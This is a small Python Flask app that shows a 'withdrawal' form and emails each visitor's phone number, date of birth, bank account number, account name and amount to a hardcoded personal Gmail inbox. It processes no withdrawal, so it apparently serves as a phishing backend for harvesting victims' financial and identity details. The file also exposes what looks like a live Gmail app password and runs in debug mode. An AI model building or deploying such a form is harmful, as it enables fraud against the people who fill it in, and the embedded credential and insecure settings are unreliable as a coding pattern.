from flask import Flask, render_template, request, redirect, url_for, flash
from flask_mail import Mail, Message

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for flash messages

# Email configuration (use your own credentials)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'enochbabatunde17@gmail.com'  # Replace with your Gmail
app.config['MAIL_PASSWORD'] = 'snlfkmclumvivyfs'     # Use Gmail App Password

mail = Mail(app)

@app.route('/')
def home():
    return render_template('withdrawal.html')

@app.route('/withdraw', methods=['POST'])
def withdraw():
    phone = request.form.get('phone')
    dob = request.form.get('dob')
    account_number = request.form.get('account_number')
    account_name = request.form.get('account_name')
    amount = request.form.get('amount')

    # Send email alert to your Gmail
    msg = Message(
        subject='New Withdrawal Request',
        sender=app.config['MAIL_USERNAME'],
        recipients=[app.config['MAIL_USERNAME']],
        body=f"""
New Withdrawal Request:

Phone: {phone}
DOB: {dob}
Account Number: {account_number}
Account Name: {account_name}
Amount: {amount}
        """
    )
    try:
        mail.send(msg)
        flash('Withdrawal request submitted and email sent successfully.', 'success')
    except Exception as e:
        flash(f'Failed to send email: {str(e)}', 'error')

    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
